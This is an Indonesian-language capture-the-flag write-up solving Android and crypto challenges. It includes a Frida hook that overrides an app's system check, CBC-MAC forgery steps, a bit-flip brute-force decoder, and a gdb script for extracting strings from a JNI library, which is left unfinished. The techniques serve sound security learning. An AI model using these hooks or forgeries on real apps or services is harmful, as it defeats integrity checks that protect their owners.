---
chall_archive: https://drive.google.com/drive/folders/1UwiI-U9bPECxX1GhQ6g5EECwpkGS9INn?usp=share_link
---

whos that pokemon - mobile
===

input bakal dibandingin ama R.string.pokemon di /res/values/strings.xml, jadi tinggal masukkin aja deh valuenya & flagnya muncul 

![](https://i.imgur.com/z2DpvOU.png)

![](https://i.imgur.com/14BRSzn.png)

pokeball escape - mobile
===

App bakal manggil systeminfo() buat ngeliat sistem apa yg kita pake, kalo bukan "Devon Corporation" dia gaakan kasi flagnya. solusinya kita hook systeminfo() pake frida dan ganti return valuenya jadi "Devon Corporation" trs jalanin

```js
let MainActivity = Java.use("com.example.pokeballescape.MainActivity");
MainActivity["systemInfo"].implementation = function () {
    console.log('systemInfo is called');
    let ret = this.systemInfo();
    console.log('systemInfo ret value is ' + ret);
    let berubah = "Devon Corporation"
    return berubah;
};
```

![](https://i.imgur.com/JfqDUmO.png)

cbc-mac1 - crypto
===

ref = https://book.hacktricks.xyz/crypto-and-stego/cipher-block-chaining-cbc-mac-priv

1. opsi 1, kirim 61616161616161616161616161616161. ambil resultnya sbagai s1
2. xor 62626262626262626262626262626262 dengan s1, ambil resultnya sebagai X
3. opsi 1, kirim X. ambil resultnya sebagai s2
4. opsi 2, kirim 6161616161616161616161616161616162626262626262626262626262626262 dengan tag s2

noisy bits  - crypto
===

idea:
1. encode() itu sifatnya subtitution, jadi tiap input punya outputnya masing2. solusinya? bikin dictionary buat nyari input dari hasil encode
2. buat ngebalikin flipnya, brute aja i, j, k yg nilai 23 buat ngegantiin random valuenya abis itu cek di dictionary value tersebut ada ngga. kalo ada artinya valid dan pengecekannya bisa pake try except

```python
from tqdm import tqdm
from Crypto.Util.number import *
POLY = 3189
FLAG_BIN_LENGTH = 360
res = []


file = open('output.txt', 'r').read().strip()
encoded_bin = file.split(' ')

def encode(cw):
    cw = (cw & 0xfff)
    c = cw
    for i in range(1, 12+1):
        if cw & 1 != 0:
            cw = cw ^ POLY
        cw = cw >> 1
        # print(cw)
    # print("===")
    return (cw << 12) | c

cok = []
for i in range(4095):
    cok.append(encode(i))

def addingboi(msg):
    for i in range(23):
        for j in range(23):
            for k in range(23):
                a = int(hey, 2)
                a = a ^ (1 << i)
                a = a ^ (1 << j)
                a = a ^ (1 << k)
                try:
                    f = cok.index(a)
                    binnya = (bin(f)[2:])
                    res.append(binnya.zfill(12))
                    return
                except:
                    pass

for hey in tqdm(encoded_bin):
    addingboi(hey)

print(res)
print(''.join(res))
print(long_to_bytes(int(''.join(res).zfill(FLAG_BIN_LENGTH), 2)))
```

jnidorino - mobile
===

1. appnya pakai jni, kalo kita decompile jadx akan keliatan library load System.loadLibrary("jnidorino") di main activity. extract pakai apktool dan ke /lib/x86_64/libjnidorino.so untuk ambil librarynya. decompile library pake ida
2. libnya punya banyak sekali function yang nantinya juga akan dicall sama appnya, ditandai dengan namanya Java_com_example_jnidorino_MainActivity_{string}. tiap function akan mereturn string base64 tertentu.
3. solusinya kita coba ambil return base64 tiap function kemudian kita decode 2 kali. akan ada base64 yang ternyata flagnya di salah satu function tersebut

code untuk extract memanfaatkan gdb: 

```python
import re
import base64
functname = ['zSIcadqMViCFJsYiNtuwhdUTG', 'FWPhkTyYZXGdJzhgyZmhezrLx', 'sdLthcTNjBPqrqGDlgLPOYnuZ', 'DapUOEjUjPcfdEKyFgvYcroXJ', 'DapKbjUrKGuNZQNRbzHlfguIZ', 'vVywhUvtqvhzdEcYsqaGIqHaR', 'dOYPSUGtlHAnJjrLxkgirSXuJ', 'bUcvBwgfyOwcvrQeZRsyHzAzU', 'UUPpTAGuGmRmEktyFoOagkCbp', 'VSbCqOBtsZDRndWNTHTDSSJcK', 'IuplJwRyJfPJyiXDJrkiGfpYf', 'gJUKJXQlSDqiOXFgjKmcvuQLr', 'BpXzjRhuXApYxZeXhkrtlbwRL', 'AzasDHTChYnJffVUFasDfgZWu', 'mhiQwiTRHXxSjwcRhUZUCOoxf', 'aLcHmKKDfXLbTQwbOpvoRRoKl', 'hpiZNVZUqlNQKUWPjzMvGxOkV', 'RlaVvyzSPLcIubbrMeLKYqGFA', 'HwISllnKytKPiHZNQfjIdJvAB', 'mtPfSkbUbKlPorsRyQZkRoaJg', 'JFeXHHkqMBiTewKYBGcVPMFCC', 'xQRvEmEipvUjQMcIjxgkyyAri', 'bUyEtlTRpFhljdDLlYUnuAJPV', 'LZDUOjpIrnyByhCDyEcOOkLop', 'KdcFjPSttWGOYJAFUtZIYYWNo', 'WLxZNICsgvWSeyHVbCbYJeAbk', 'jtnsjjINELKWnmbaanPeHRenR', 'rjeHPrxhOwSLJXQCfUATIMdBC', 'jPvTCltKZKsspNRNhYADAhBFx', 'wxWkDMWsGpBWLPwPuBKlEVHpp', 'dbSuAMUqNCjdjEVvzeoepYHOz', 'pLnkfwyyYMIRIDQWpeFhRDlqg', 'VElbtUahSqeCADWmneqHvFuSA', 'sQGuXUafJhSEOrOSiCwuRlUeu', 'rUbBNtuOYiouygrbFCQOsEgzR', 'lQFGeOLinGIqAkFqXNmisyRYY', 'qhAfngERXEcquhskYdDloBuVm', 'QAGDUqBoZfPhwcELwAelSUTZL', 'FEkmExqeafvnxelyTSyYKhFot', 'tjLPwIZDoVtNKdfkdkmRcEztb', 'FVuVTBbwyEcTnYpcseQNVqKtj', 'iZaTAaVDCGWvtSqvtGsGpDcIi', 'MkSKJhDFNmhAVNaZUJsjWkhKE', 'qhlDKjqASFriPjegRaaXOqLGY', 'hVmgcPlSihqvhOqkjWGcvKIQH', 'WBWuAaChaAHqvfQNktEYJbofo', 'pwJBcXTLDPFXPxuhoPNEBPApT', 'EFzbzpcRPZEkBiXZfFFDrLynl', 'FOfosSPjjbLjnDCwyUbkYtNDx', 'RlWUdzVHZUcqYjPAtjFGsUQXc', 'MnFpNkGTaCXsDYtAgkTcQvNmY', 'tgLIhtloHNREnUltVDFDVShGv', 'aKMnxNVbjzzeLJQUGQtkMoOQv', 'LglUpvAvgoOuEQYGHzaWYDdzh', 'kHHUtPpBjyVvnWNPOtlSVbKRi', 'LspHCMVqQNYMRLgoTaTZKJJaW', 'mFBrcSlqlaWDAwUGqGxrJGKOm', 'ZnzVtsKMprFXBPoWsYifWDQPT', 'ZcWOMRzwBSElNLEFizASNHqGX', 'LADAtSMUAMBurCcaWSPKjldgV', 'lLUZYOQNmdKewjGqetyUEMbnt', 'SjjEdPHdSLoWMoEWsErLMEzbn', 'TOqIJQvQPTkkNplmtKrjLlFUR', 'qBgPSWTUgnOeRIkHTTXeegsVZ', 'rWmZPhOqWwYlncNnYTPdjwfkg', 'WoDMAhJMavrzmGYlKgVMSSJuI', 'KGTkxzkcaWltVhMDpyAthoeNY', 'VcdlgDlbzkqGYoFuYRFteOrtO', 'vNlKMhVuVZgrCYUtVUhAGZutd', 'UYSeocPswVvnZkuOqoCLoElVf', 'CuSpNOssMPgClFPuOMcZbldHH', 'vjrqPMPPQaMhYkWfOCKlIxUub', 'YSrVkQcFDhVRJcoIGppKpsnjO', 'TWSTiWVMNphxGAwybJloybpMr', 'xwzFzDGiSVOtBTEsQfstFFxvV', 'jESnIFuizVOBimwemuhgLFwWH', 'DWbwoIujXKrDMpgNzhWXJnVRw', 'xpspvHXAhRQcNnAvKQzQXMjsV', 'FtfSSLWssPfPBrJmTrNkZGxXN', 'mdjXqkZUZlhBcgRphyipuzwUV', 'UlgqycQzjAfylIwTLwuwhsSwG', 'hrVfPFqmsxddykdjXvpUUVDKM', 'oIlOmTgNmYVTAqNYHNRqJOorZ', 'hskEaDNlZiPxwwdjDRfmYBMyP', 'MACPctlyzYijvcBoSFnxKkkDw', 'hfHHpciPThRxlXUVsxjxhYOpf', 'UITzeOHZcerkuKFMjqLSvTSGs', 'gkOnSXyEzxbQevRbfLkFtItmX', 'WbxbfIJCWKOMzVRBgQGCWqIKC', 'awkZvluaAqDDOpBKyNvdtwWvm', 'nJpzgFmhxCHuuEIKeHZrscuof', 'KhDmxmYiNQSEyPOaxwEWVVtGw', 'iBbUsGwHluYLWdfYYOxZVfpqf', 'qlCszVHHWYoaJnzzsPYdGtiyF', 'HWJofjubUUPDpnJDNbonQaNFz', 'xjseqOqfpxyiPlKqNazvPDwUa', 'sfDvXxOVZwBMOhaAySDNwqINv', 'vQDkdnFvoOurlSQdholpklhpA', 'ENJdpQUXRTYrLvARTOHBPcFMv', 'vOxkmqqOYldzriTYCvmMnzDCp', 'JfjDrwyrBhUHHszCjAfnWbgxT', 'HydLwVrdEFRgIBrlSEfCuLFgQ', 'mRvakATDEBVatpdHFxgKunRpy', 'iUfLItyVgzIzVqBPjDTODadkv', 'nlKEokzcPsfjMPvxYAYbbFXAM', 'PtZJEXcEWVoDbkzLqawdGrKoi', 'pbKZEofAABeWwhCryLsCndCpt', 'rmqPnnMtGceoHJXnCiIuWGGyK', 'OMLqIfSgFthHAjonNIWxunaDw', 'uulvsYBwLmUQHyesbOZcDKdrE', 'iLZHgVlZJxaXJyxOcTgSMNsBa', 'AZICPtydUqiZdThMayRzXifEI', 'tqqbgphbbzqtKBZgFbJWSLuXJ', 'ctvtrhOdHmOhrZfwBFjntCQMc', 'TRSXrpvqNnYlrJCGjOgXNPrRT', 'HsgEcHtudiUFdMdGBWnbkgmjh', 'yVyyYHqsVBvdBPRQCHqRZXTHL', 'UKUTWWaLZYwBdcQsOubESzDIz', 'VUqwqTpmykVCzNRcoLqssifpn', 'vOlErPuqCJoBcLfTetWVyMtXq', 'sPRvQJXMWdDgSHMSsbmqwYiHi', 'mQtSgFIrxtYlVJrvXXJNjRGzd', 'tcFzfSQxxZvLTaoUVpPlbMres', 'nuXLYQjgKClxfMUaLSDOWnilV', 'FSMlnnDeFcwBlODlGQFSEOFjn', 'edYXbNBUShINcExrgWeVTrDdp', 'eJEOBPhChsGBxQJPWlBANrZKA', 'knXqPNoyohbndQkMDwmTIVDbs', 'CKCuYpVjBOIDsJUrGvDipUaJI', 'yWuGkqSfEeYnEzMqVQacSDiyB', 'gIOTPWVrDcQmRRDIJeCofuUuL', 'zkcPLQyeVQIkHQEtDYuDdlsNX', 'iPBRAewcHUmUKUOTEPuzTBSUr', 'rZKulPwjrbFOFraQxjHnCVuOF', 'XZBUpnLaFNspxixxWhucYYkCc', 'cNgZiLQggQRFxgyELrsBifznz', 'TgQYVZJncDaXuzDYCVNmgDfYx', 'FTgGdpdgUViofUwTzEcYHmOee', 'uBJXQAQKfbOwsJhWclxmZqBuj', 'UtaUoznIfThVuwWEIuexSsCjd', 'VZcvlNUvwLAtYDcchYzfRjjHC', 'uEPCfgLKGGrGQNgIrhelXbJgM', 'diWXWNxXdUvyoebXQHVpVtrbu', 'kbtiepwNmWVyRPTchwmlpOTOE', 'aEzntxUTJXUvzzunipWIiafhs', 'YYFdbZqmDTGQXcgfspyulONdd', 'tEVfMFeBCietIWbqyngfwYWmD', 'TnrxazNnbnVDGkOYopiArXYTV', 'YHcIVdASMqPbRjJdfDHwFebOd', 'tfrPlhSSUCuuqLicWvhQurVGm', 'IkBluZPinKpIyyhaxJcQmTKRo', 'KmWcazuozgQQbUfvoeZKOMQgw', 'QIzffizygBMMZZUWRHRVvhvJf', 'HIgUyeAHylIdoFRbAXwWBWpcK', 'ozvahpSLYkRvFKFJJgwsBVOtE', 'zHtgygPEJPNUKwTvBNgufqPWs', 'MVAjRpBhcjIAqAkPVDcMwmEiO', 'GuBfjbQagWhDtJjHnujUdwUpY', 'kxykBmcRvJqfSyvqljUgcAFNr', 'ZXpwAiaWfBHxGURQuNlXmDXTe', 'aYrhpCeXehZmoqgjXkWlpwXeI', 'cFtxLLJmMMwdhossNzePKBJtf', 'pYktRrpYTlHSpTmOpPWirdtiI', 'tTsHNVCLggUbrGLhnzgfhoPEd', 'lTdvGNIfYTBcdYMIWeuzvVtiw', 'rHJmNrLSlpQNOiTwhHFQDcJgh', 'LMfLWMygzLUNgJnFUHboqkjhw', 'WlLojAcoKPMaQeLoEAqTanJsT', 'CaCToYYthmvpElGqvzWcHqDOx', 'QNrmNkLxEwFeWpFyhKrpHVgnb', 'gZtUQvkXdvhYpjOamcHXALosq', 'yzPyJJmgJpmezUKJSsWMttbXp', 'tDWgDUOVEVtREBuxtphohqwjB', 'AKSrTVaaJWZtzBASxJrQPsQfE', 'mhusQTbLQBcWvXDbFwnuWkrEH', 'VfdmxpAPyqkNdtXADudijZnWT', 'XdmmXJSbSKVVvARXjuQgzIfFM', 'NlMKvXJRmAatJkMnWNEUlZPUW', 'wwqOjtrBAlirgNGVqSrKohUzd', 'LenRXfdWADAPPoDbjpORaFBVZ', 'YCwuUBFUpaQAnIRyLJQkHVqGF', 'trqrwYeXdjMdOuBaeMFepFPCw', 'LbtbkjGDekyIgvquQTJNKGeGp', 'QIJrvcwPmHKtlHZECjzHxNqdd', 'kIkItQtuogkldrURuqHuqqmkU', 'ftbAfdmPAYQcqMsPkLGhPoIIt', 'qZZfSlNsBlkejWsfNuFhIlGgI', 'ctpDgarIsesGRaovdaZPPAPru', 'TppyMjiynCpvhRqmhfxilMtMm', 'qrCVqBwrwAUrzcdyLTOTTaPZb', 'oiEsyDyEoocbVtqgqhmKWUFSw', 'cNDyKMuxUHQAkRKrepNShcxXN', 'VvYuVwlcHIKIOhFVBvhOqrHDw', 'ARmjFkspHiFtfmUAdrjOoJQMv', 'mEUcoTFNVjJsMcUCPOVdPzxJR', 'AobOxYFAfkhqevnXFyKVCRiHv', 'ESmVxiuhGnZoJjsjykCmeOrwS', 'iBIPTrwprDlXSMdiYYhxsDwHE', 'UmCAnpLYNYgBWUQipFtGPbpsL', 'auDBauypxtXVVDFOATxedrNtS', 'SmQDuenfPxHJLjMsHxZvYQGKv', 'IyqKVweZaDneJeoHCMSrOnBBj', 'WRbybcjCdIYlPrCzVCKVEMnkk', 'uzwycQnXFFLNQJVOZvFaIDnsH', 'ewvRXrgcqdeJFZqBrccKrTPti', 'kLYuzEAQLVuSuirFIiPRSrWPQ', 'FnpKwwIsSpdawuvFQViITWsdd', 'OGgqSupqesjwgwSmBkEoPKyQP', 'PbRhAVhABJkLWADetxufWuAaO', 'XeUReaikktZDpjPWJZoEBPuDM', 'iWlOyMFzdSNMuqLFDnnxGautZ', 'oKdIRoAXafxwnHroqRPOOMael', 'ymLbVRPGdgZCbcdckqFLpbtsQ', 'BPYLujalnPPSlhqfMVGjGlkYT', 'xtyZcIkHYMUPIeJIYAHzuYPTm', 'ZFOYPUTFiHyauqaIKZGkfWSND', 'zeYMZCfgMnYZNHeWEWaAcqyNX', 'rSqYimwozUuHSgfGCerujpBPf', 'DgbqnRpSHgahnIfscUAoAtuwE', 'FOanBGGHyWrAvCQMLphavVyAS', 'uiKOnYDNKmXImvsgMUMYTmEFS', 'psikSxqSzEemsmVJnaknXfBlI', 'zlNrMZqUFQpwScGbWNcGcIoBV', 'EwPFceVPTKKewVRseTOHNxMFA', 'CxcMaeafSryVnBHjFYDURSzaY', 'fgTZjucoJkiOUUHcPWAuJPlmX', 'DOjUoqMGaQgsntmOnzzEfAejQ', 'slKTzHTYyRrVutghbLCoBTUkZ', 'WiBbNJKQSJvqUdCifEoqxbbGt', 'aqLmUgeaQSjsMZnuFDlGUcKep', 'aHuFYbtOLyEWcVttYkArBPlSB', 'xpHQxyzIlWFQjKctLNmAPWpnG', 'NMwGwgthPpNbZuiyEJAKXCSjs', 'AiXWbkXAMNWqPPJpVQGFLQDNn', 'lbhmXaUSZZVegUFpUsEIhNhuH', 'LUlETlcZuDXGCjJAzlopRiYSr', 'bcraOQKzVuHhHuJOoRhsnnbxF', 'YHvtRRBlDtdbWdWNEytjkIvhr', 'sIeefknOzDwSybfqlPlNTgTKq', 'wOdDFpiMXACiVxXknppURSHFw', 'quiRckvhfVnzoJdQAdRgmPUlU', 'ouhNWxoUSEPGOcWZgWkrkDrVb', 'wqIWkZagtVpTwIUMzpHkwupmc', 'qnGRaTveQBGVteINHHRCzgImZ', 'LilrPPiEvLWKPwEKktYgJCTVb', 'yAfftIHwGNsmOrQLXCWCIUuEf', 'VClLAJFTJIbwrtpGKcwKicMAH', 'CWnoPQXjzqbgfpvdlJFsJCxGH', 'gXbrjPdgPFblbhxxmCaqSdbPq', 'DYszycRukLWnMbhXSiBtdgKYv', 'exObRJnSmFnrsBBGXSJyBMiDG', 'QsCgLAGSkBrhYadRslPkhxGcy', 'qdZevfwbfVZuyIyBqxMTQvGcJ', 'BVvwugwqbvKkUBjTzHmQKjDbo', 'bEfAbvQFxtqCliChDAcTluFsO', 'TWcwLtuFPnZxzNooICrfXKwnj', 'JSaiZVUFYsGpHnpouuJApnhZe', 'wozSRbdWHRkDYgfOTFiawkdSa', 'tNsjtNPOJpTiQTCRpeVkvrDGo', 'yfQArTFDOtcXInuvJeUGylCHU', 'TTFGiGlAvLzlUrnAEOOuvixMC', 'DzUGtJoDpPlbsGXzcrSsNaKVs', 'wtdyseMwQkJMiBIxgEUOkCzDH', 'JbrUiAotpqIToAEFrlOTnOKNQ', 'bDtwPhKhyioSwjzVHeEcaezOJ', 'GvNEzUtsttLayLVqdwNAupvKS', 'aHKbgEBJuqTMlyhazjuSusXIE', 'GMDngaXIETCJjfnLxpFflnGdV', 'mEdHJVNWAPZWnFkqOSCWIrAUR', 'RHKjHHrIvBoyjUaMlMDTUMVsd', 'dsYfJljXMJajwUcyXCcTqUuYH', 'hStUotKYkeAAVfYlgRoDEuRuP', 'kCbmAZgdWmbesfFhxdNDwIBNg', 'SrWigjuWqaQhqLNzaYMgZXbqe', 'TREcjeIglovVJozKwnhzJxOhK', 'WgDvulJEcdZOJrvpBeEEZYrnL', 'JfjgmXWUSzwtXIdehgoghhNbG', 'MuBaDECPfSQxCMfcyjgoMkGVd', 'yKHgzsYwsCXvkeYEPrNXVOixu', 'ErQpUoRoMGiakzTDKzBSpCWxv', 'vpZQYcCmveyaZTkfJRkjaspVm', 'xkVrAkRTnzcLEdrDIJJtSxQPY', 'xhqKoscSEEhTzjbOMfsWWhfUI', 'nIblROptWpkZXXghCVmMmdpdE', 'sxCuyZqxYLMoAlrrSYJeIfzNr', 'gCbQXUxuCyELmksJIyQxHBJwM', 'GhLagoBPGjAdjYQldkhrYdgky', 'BiJMKQVipFSdNIkQbLybBbXQR', 'HqLHtOIXXVapuFjCNxoGydPdg', 'zdimbrcvrrbAxKsDsplKqxzEG', 'cZMPAlUdRWUVatHAwOsJfVWdZ', 'ktPaGxsIqeyestsOsLXYzQMMB', 'oLggGpUfkMsagykAKRjpbXwgw', 'MTVuoTfdudCnEgeVFVaTlMiiQ', 'BQmeFloMxACDiZTAZcbaKGGXD', 'jmXYOekgRDZcdzugvoJrGxVvv', 'IZuAXWMEtdCLdalZvnLwFkjRs', 'eceAIzVqDgCTJtSoMGJNIKUez', 'fzHMBoAxJTrhkeCNIkRBVkSxs', 'OiNPJWidKatIqBmmdlXxGxKlP', 'MKnYvpOEwZJjpJhRzzMkecJGy', 'tYfxsxaMpYzJjyRfCqzQKuUuj', 'dkxmNurwOLCJvRuwatRaAExXc', 'eeWeHBfodDcGYZJMMUZABZjqa', 'SQvLtmYbShwJGbWhNNCtsuMIN', 'obWhoGxwGhTgqiDhXGktHvgiq', 'DJmyFNJUimequdeaWEniKmkrG', 'YmvnnelBzkpFsivMTAclFVjBC', 'OAlvPWypRodtBbpthybSzOiOs', 'lGIEDqvNuNrpmXsLwbmLXleLo', 'iYyuVxcWIVZKvZuMvdrMWYJkO', 'yQIjbXtrhjXRWttaINNTKveCM', 'oPFBrobWZtqXAsJFhhPNjfxer', 'uCBAxmILJIoqJRajKgRDbFMsW', 'CWdpVYZgJVgNIKXDBEGyKclaY', 'VEgQQesQFOshWZslxahwlEWlI', 'InNetQwKVquoQBsLVMVUKrXyY', 'HKAxeoiKPrFvxXCnQTrAmIaKI', 'LNshPcLtBzGlpuvwGxHYfnMmi', 'QsELSJWjCMnjIqNdnPcMUTlkW', 'uRKUrWXuybehupgtspIRgWgYW', 'KnGQSpuFVUlBbLbQpxyWrpLqw', 'tWWzzZZJUBLhIzsRhWdwPMODu', 'RreroSeYPCnHWjTGvslTjpQJf', 'uFnLMvtIAKDrdyRtEoDZWltgu', 'BqoIClSkOBQaiGSmdLhEFRdUp', 'lSEXtSGtiegXulIXCAhYYyIRs', 'oBNUQehuytwbaTdariwjCgSQH', 'USflKCixmPWwRKrQpgEOOxVlc', 'hViAcgQaTVZwRdrMMiJObMRqT', 'KbMkvIDawCZENgULhwuvckcGW', 'JVcVIlSlgHDNlpyaBEIVycSAr', 'GNICOClsPKqoFWxSbxFGNJAuR', 'PsveMiFzbCOVeaXeUKeSqhYMM', 'JnYEHUeIAzOWBaIRzmUEPvQaz', 'BQehUozAPoNoIiJpMGgEPNnCS', 'ywdTRcNukpSBMarTbVoILjrds', 'dOHqOBdjzJjywJxKWeIAFpFof', 'uYNcyuuyENbILqtyuYXOfkuBr', 'qYvmGEZXIZYKoRByowRLpUAzQ', 'qQjrxWNFeqrpAvBrnjMvKxBnt', 'amYepmsNTZdzhzdkDrJpexxHE', 'WFJZFQpXLqaDbAlSSBZXZOKqd', 'yClxugXluUUuxsyiNDdquVcQo', 'EHTKtvdfgYcxFhOSINtmMlSlm', 'CrixQInYNlJMnvQGSCDshqprX', 'kXxGwDtiTupEsdZnrVfZHouud', 'NzWUmvjbXTAXRiEfjiOMlzEQb', 'xNnCyzduQbHjBfFvberfLIfYe', 'dVkTzHRTolVVeZIMlDBryxFes', 'JEjcbcgWOCxuWiWgbpEEiCHZO', 'InmcMFPScqnAuGLhfyiynMIEz', 'mWqGZqggUNzVnqyVZTYovBEHk', 'plKtmvfgqvLqahDDBLIWGnQZc', 'pqivmdwxZKrhPgiSgFIMQLiLY', 'FjGlrMlhrtfjKYAgCVhkpndAE', 'HGZWDNpcsflkQLdDqEELtPKFY', 'DkJNTaoebddfywmbprMrrjKvu', 'LDUljVBwEBBNyxLxQLbmiCrKp', 'nLAQJMWVOGvzAuILqlGHbiNsV', 'TGqKfbJXNCOmhRVPJvkThGVHU', 'MlbfspPVdzEFuoCwKzfbRJAuP', 'iUvQZtdlkhrbeBwSYWJIjsPSi', 'pApfMwuGgCQuDuVDxDzkfyIOo', 'qfSJOgLDtSyOsXDFtKstGgNte', 'anQjCqOpuZoAAoZVmidopoyOi', 'zokZuwMcyHPDLqXbEOfjAZcVf', 'paWPvrXCUhwbUrDjLfPahpCgZ', 'tnBnBMDyPrMpnOIuMluMpcrPa', 'DbgetVNAVmnoweuWoDLRWUsAh', 'axbNCsUMvpRjtEkRnDVIBgbxk', 'InLnxuUhdWtXNJReOcnynfBnv', 'QaVYAxViiNDXyOEmuPQiuBQBB', 'VhTANKjPldIEMgaSVuluKJHmV', 'XtNXZTaqdRgCFRfxTIeSbwslE', 'XUUAZQtPBGPjortxJVrQkwuYB', 'lSadbfjxxzhhmISmBOeDitWYs', 'XktFrqmBqNFhmPDEByFwYSFFQ', 'JsexfPVlDMADbPOBEnHDliYVr', 'oDjiGzdapDYziWOZEWpbbftIY', 'tjSDFkKZcVOwQllZLuUKUoVkC', 'kgxagShkpzRyVNVIjDrJlXsNK', 'LzaBuTHmKCvVapgzWSSDNOUwA', 'yujKBYLDbQIGyOUGbrAWUCITl', 'AHnerkOopeiwcLNOKxAItVlrK', 'vvypYcHBgdemvswtFosbwJDcp', 'VOvYrPxXoWSlcCTiwxWLEoSWm', 'LhRuqWUqLOzBOaSvEGkQqKhXF', 'KmwqfEdvdEhioTkRAermgHdDa', 'WlhfSFtJJDYxWZSuyVUOoiCeh', 'raUGDjlQrQdhiczdNgqxypJHh', 'ymUJDlfEAanehySNvoGKeedYb', 'vEDnHmOEaBwWyYbtLBeppRiEw', 'geehLKnaXmNPLcmGVEaWiELVk', 'mizupqLTRiHaTDHcATBVLfjjs', 'lDbMPDnZyBJcMQcdMkQsXwUbP', 'rjDjZSCBksnFAUdkyBLodTzmd', 'ngiQtcuascBAWDQktczMvhFxs', 'gcTOEAhMcrcdJIFIKpUYaGxmx', 'jzeEEhPURfbOlwLaxoYvzGpcd', 'DzrztKpIuZxxfWRPYxcZivOsp', 'rwtmXLcwvGaYlsTREunQiSZZO', 'jVyjoXqtIVrTpTQiwvbToQtQY', 'eAobGlopnTOgzLhUcdZJAIIla', 'MAYoUUFnQsOBQdKVOdDIaVtyt', 'rWtpadvZsTISzXtyEPJCBRxke', 'yTDmKLjhfdSldJagjHrXmUoZg', 'aRIFaLAwHfldstPttFLFkkfXQ', 'TOlQHsSAFlVdukGFzKwYFhdWk', 'NTOOLFFuaMyCMLivNvNzJpLXJ', 'yTokbODjdArvyEUykuvQWFFpz', 'ifXJUPUkjTtVoVbWPhSRhOTbd', 'RJaYZKtSzSYReVVazkcaPJAIK', 'uiSQrxVHmgQEIoQIavOKTVyGR', 'AovcSlKBnUMGQTGMyEopQEDFt', 'gCYTMvnPJKwJvRoVEDnYasLSo', 'LdFcedGziwqrVXTeTuGzECnJK', 'yJPNzQXvHLVaVKGxBzfGrAMcJ', 'ImQrwgoSQdUJjtZKRcMFYOQkn', 'FpeczmINrjFVUoLhJObrRrVxU', 'qCKVFcWNPZaYRRTAYWoehGfQW', 'cXYoCyNhasrSvWazomkbsMpAK', 'HfIRJZEGeTbCHVaBeGDDgyJwe', 'DNzLbtkeuufmVHcFYSDJNpZKW', 'cMrMOSygNHmpKLcqVeMRnCBEs', 'CtdIONwScimFAOgIvcAtvHCJt', 'ocdBuDHSDMRwmhVwjftElUTgR', 'cgSjJcKwhipfKFTakZpQgEgFT', 'KejbXOhRXYZjWoHiUvJIUIvpK', 'woVAqKwpOUbhrboSskpHQjnlK', 'CxUrHzLsNbzfTwPLwEOYOhgKO', 'DPYTHnyWfIBAvZCieFkAextnP', 'rKoUSyxDvfeCaSDzrYxTDKznw', 'sPggvpavGHpuOHguhWYZsnVnf', 'PGdVrENJBwajjgHRGGnTtSuRf', 'wGCNDvHQeRXyoEmsaBFVauEfU', 'wHRjWihsSxutHKaRECvjxsIUv', 'lScEviwQCaiEVGWGqDNShFdSM', 'gBMPyaPPjdraGycGBshduWDbh', 'bFifOfQJHBRASxHIQIeoyvICw', 'cmKkBFxSlKFKnoJFWNfGsPaDK', 'NDLoOdwdSNCSgEFrZncXLunWF', 'DeKOtJzUCUzFhafjBnqUHxQsn', 'GcBmiuDAtaAvurHCvETTQgUhN', 'eMJOhqoiULqrRRWrMwmuELBRF', 'TKLXExTBBEuSUsUxkTVEdwcwB', 'tNCgbncajnrmWacOUjgZbqRzM', 'ZRlbiglggjcjKDwXeOLjAOFhb', 'ATHgmuyqWwXbkmHbIuXLQZBeh', 'cczTauukpGWZSpbTJFhFKqqTy', 'NwUaqrAAxYeqceiNykhDcrwCc', 'rBbkSUiDhYAcdxmctBUPzWkZM', 'enpQhtqgzyJKRQCKdyauXNEjd', 'wVYJrubqUOcSrYfPmlojBBKlj', 'QkpGDzdAiLRPxeBkzdCPIfeZm', 'vpUZRdhTLDRfSeiugUxjqistp', 'MEyCWVkQAEbbEnGyAxGjwNaRh', 'DToGZremONqavizPvmYmqnpeK', 'CdvJAjScfRABxuJCfuYgfyoXa', 'aTlGnZNZIeofuZdlcqHaizbzy', 'YZgpFAbSVmcBCzPsIOLfAtfWL', 'roCetXydhvjQPrhvnIgrdaxTd', 'VylNQBMdIxJsfxwEnScIMmhfB', 'FnrYVZxNiPNeejouuyrAALcaT', 'DQPSMxVZQZokfHbTQarEbOoCE', 'cyvDOcXxcwChwCVhWNOFXUlmz', 'VNKfzcpEzdYYduKauXFPITpUt', 'NXvLnoEaoXYwZVkJHWYglcDnt', 'SAJDUpKaVHfPhSubJmUqIgIpF', 'lLEDnEZHPwvQeGuqboelCCUXA', 'QXUCxEfiCIbPxJfwZgbUHUePU', 'PnPghIsNIjMXPGvKbluDUvFwy', 'xRpKRONjVacXsYgaMsgvkYqud', 'bslLojJCiKNTGhElAmFutfuBT', 'bmHIQhqDVixTxaJksQUnoOysb', 'eUHdyHdwXdOFDnlumNBsOKZJz', 'rZHrWoBGJWWfprWrbgEGPxUEf', 'SYHjhvreXFCflwkXEtJsOyeSc', 'YetQvYwlTzMvBkYPokCaIWlzS', 'dbxtWivdhZLhwMEZHQScIPMmu', 'EUzxRKnbylpnPiSMQMnGPpyeT', 'YixUdyeWZkgptZVtCjnUuepQl', 'QtShyUxDqqzliOxvZkQMXaOEu', 'IFChvnNyenpfmxpwhIZFVqEyy', 'FMRWOZZrYWZxItdmQMcSlctUu', 'TuwXGyGkyshtjOpPhwOakLbCC', 'uPNebsIHHvOlkXPiZrwSzqPAq', 'WPTuHyFQKSUeRldnJiSLBkByv', 'ufHWGbPyxBOibeCuuiuhHnooz', 'bzqbLxcNrgvWQZMYGbAhPgAks', 'WpOBlSeioERuPNIqpjIYcRspL', 'KKiAnonAruDlZPeRSXoCBQJIH', 'zLLGTDBuwwYUqFkGyFJdERqYj', 'LCxqmeGBkNAxQwGsMhKkeVCcZ', 'yUwOkrGcOPQBsTuewFPWsMPxS', 'BqaqLRPqwATEzgRqxnxVbNecH', 'PBafjSbYilxbLswmuOwvyfeGM', 'RyLpkwoaGvETVvjNTvrZkIgPQ', 'eDAlSowEpLOslQJbtNzUrGdmx', 'IJJFsPeHFwZyoQhVFpZgMHyIS']

# run like this: gdb -x warmup.py
pattern = r"0x([a-fA-F0-9]+)"
pattern2 = r"# 0x([a-fA-F0-9]+)"
pattern3 = r"\".*\""
gdb.execute('file ./libjnidorino.so')
for i in functname:
	address = gdb.execute('p Java_com_example_jnidorino_MainActivity_' + i, to_string=True)
	match = re.search(pattern, address).group(0)
	# print(match)
	inst = gdb.execute('x/i' + match + '+ 29', to_string=True)
	# print(inst)
	match2 = re.search(pattern2, inst).group(0)[2:]
	# print(match2)
